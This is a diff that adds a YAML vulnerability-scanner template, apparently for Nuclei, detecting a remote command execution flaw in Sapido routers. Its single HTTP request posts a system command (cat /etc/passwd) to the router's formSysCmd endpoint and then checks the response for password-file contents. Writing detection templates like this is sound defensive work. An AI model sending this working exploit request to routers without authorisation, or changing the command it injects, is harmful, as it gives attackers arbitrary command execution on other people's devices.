@@ -1,0 +1,27 @@
+id: sapido-router-rce
+info:
+  name: Sapido Router Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Sapido router multiple models remote command execution vulnerability.
+    Allows an attacker to execute arbitrary commands on the router.
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/Sapido/Sapido%20%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/boafrm/formSysCmd"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      sysCmd=cat+%2Fetc%2Fpasswd&apply=Apply&submit-url=%2Fsyscmd.htm&msg=
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*?:[0-9]*:[0-9]*:"
